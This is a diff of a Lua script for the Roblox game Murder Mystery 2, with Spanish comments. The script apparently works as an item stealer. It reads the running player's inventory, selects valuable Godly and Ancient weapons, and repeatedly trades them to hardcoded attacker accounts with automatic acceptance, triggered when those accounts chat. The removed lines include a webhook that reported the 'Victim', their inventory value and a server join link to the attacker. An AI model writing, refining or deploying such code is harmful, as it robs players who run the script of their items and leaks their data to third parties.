@@ -16,19 +16,28 @@ if not req then warn("No HTTP request method available!") return end
 
 -- Lista de valores Godly + Ancient (respaldo)
 local fallbackValueList = {
-    ["gingerscope"]=10700, ["travelers axe"]=6900, ["celestial"]=975, ["astral"]=850,
-    ["morning star"]=720, ["northern star"]=680, ["moonlight"]=640, ["helios"]=600,
-    ["stormbringer"]=580, ["reaper"]=550, ["blaze"]=500, ["phantom"]=470,
-    ["zenith"]=450, ["ares"]=420, ["hephaestus"]=400, ["mystic"]=380
+    ["gingerscope"]=10700,
+    ["travelers axe"]=6900,
+    ["celestial"]=975,
+    ["astral"]=850,
+    ["morning star"]=720,
+    ["northern star"]=680,
+    ["moonlight"]=640,
+    ["helios"]=600,
+    ["stormbringer"]=580,
+    ["reaper"]=550,
+    ["blaze"]=500,
+    ["phantom"]=470,
+    ["zenith"]=450,
+    ["ares"]=420,
+    ["hephaestus"]=400,
+    ["mystic"]=380
 }
 
 -- Páginas para scraping
 local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
-    ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
-    classic = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+    ancient = "https://supremevaluelist.com/mm2/ancients.html"
 }
 
 local headers = {
@@ -107,94 +116,73 @@ local function declineTrade() TradeService.DeclineTrade:FireServer() end
 local function declineRequest() TradeService.DeclineRequest:FireServer() end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
--- Preparar lista de armas Godly/Ancient
+-- Función para obtener inventario filtrado
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
-local totalValue = 0
-local weaponsToSend = {}
-local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
-for id, amount in pairs(profile.Weapons.Owned) do
-    local item = database[id]
-    if item then
-        local rarityIndex = table.find(rarityTable, item.Rarity)
-        local minIndex = table.find(rarityTable, min_rarity)
-        if rarityIndex and rarityIndex >= minIndex then
-            local value = valueList[item.ItemName:lower()] or 1
-            if value >= min_value then
-                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,TotalValue=value*amount,Rarity=item.Rarity})
+local function getWeaponsToSend()
+    local weapons = {}
+    local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    for id, amount in pairs(profile.Weapons.Owned) do
+        local item = database[id]
+        if item then
+            local rarityIndex = table.find(rarityTable, item.Rarity)
+            local minIndex = table.find(rarityTable, min_rarity)
+            if rarityIndex and rarityIndex >= minIndex then
+                local value = valueList[item.ItemName:lower()] or 1
+                if value >= min_value then
+                    table.insert(weapons,{DataID=id,Amount=amount,Value=value,TotalValue=value*amount,Rarity=item.Rarity})
+                end
             end
         end
     end
+    table.sort(weapons,function(a,b) return a.TotalValue>b.TotalValue end)
+    return weapons
 end
-table.sort(weaponsToSend,function(a,b) return a.TotalValue>b.TotalValue end)
-totalValue = 0
-for _, w in ipairs(weaponsToSend) do totalValue += w.TotalValue end
 
--- Webhook
-local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
-local fields = {
-    {name="Victim", value=LocalPlayer.Name, inline=true},
-    {name="Join link", value=joinLink, inline=false},
-    {name="Inventario", value="", inline=false},
-    {name="Total value", value=tostring(totalValue), inline=true}
-}
-for i, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
-    if #fields[3].value > 1024 then
-        fields[3].value = fields[3].value.."\nMas armas en el inventario 😎💲"
-        break
-    end
-end
-local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
-local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
-SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
-
--- Trade continuo infinito al mismo usuario
-local function doInfiniteTrade(targetName)
+-- Trade continuo infinito
+local function doTrade(targetName)
     while true do
+        local weaponsToSend = getWeaponsToSend()
         if #weaponsToSend > 0 then
             local status = getTradeStatus()
-
-            if status == "None" then
+            if status=="None" then
                 sendTradeRequest(targetName)
-            elseif status == "StartTrade" then
-                -- Agregar todas las armas
-                while #weaponsToSend > 0 do
-                    local w = table.remove(weaponsToSend,1)
-                    for _ = 1, w.Amount do
-                        addWeaponToTrade(w.DataID)
+            elseif status=="StartTrade" then
+                local blockSize = 4
+                while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
+                    for i=1, math.min(blockSize,#weaponsToSend) do
+                        local w = table.remove(weaponsToSend,1)
+                        for _=1, w.Amount do addWeaponToTrade(w.DataID) end
                     end
+                    task.wait(0.3)
                 end
-                task.wait(1)
+                task.wait(5)
                 acceptTrade()
                 waitForTradeCompletion()
-            elseif status == "ReceivingRequest" then
+            elseif status=="ReceivingRequest" then
                 declineRequest()
+                task.wait(0.3)
+            elseif status=="StartTrade" then
+                declineTrade()
+                task.wait(0.3)
             else
                 task.wait(0.5)
             end
+        else
+            task.wait(2) -- espera si no hay items
         end
-        task.wait(0.5)
+        task.wait(1)
     end
 end
 
--- Ejecutar trade infinito apenas el usuario chatee o se conecte
+-- Activación trade por chat solo para tus usuarios
 for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function()
-            task.spawn(function()
-                doInfiniteTrade(p.Name)
-            end)
-        end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
-
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function()
-            task.spawn(function()
-                doInfiniteTrade(p.Name)
-            end)
-        end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
